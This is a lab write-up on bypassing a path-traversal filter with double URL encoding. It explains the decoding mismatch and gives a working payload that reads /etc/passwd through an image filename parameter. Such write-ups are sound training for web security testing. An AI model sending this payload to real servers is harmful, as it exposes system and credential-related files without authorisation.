# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

## Description
This lab strips traversal sequences but then performs a superfluous URL-decode on the input, which can be bypassed using double URL encoding.

## Analysis
The application might have a security filter that decodes the input once and checks for `../`. If it finds nothing, it passes the input to the application. If the application then decodes the input *again* before using it, we can bypass the filter.

- `.` encoded once: `%2e`
- `/` encoded once: `%2f`
- `.` encoded twice: `%252e`
- `/` encoded twice: `%252f`

So, `../../` becomes `%252e%252e%252f%252e%252e%252f`.

## Exploitation
I need to retrieve the contents of `/etc/passwd`.

### Steps
1. Intercept a request for an image.
2. Change the `filename` parameter to the double-encoded traversal sequence:
   `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
3. Send the request.

## Payload
```text
filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

## Takeaways
- Mismatches in encoding/decoding logic between security filters and the application are a common source of vulnerabilities.
- Double encoding is a classic technique to bypass single-pass filters.
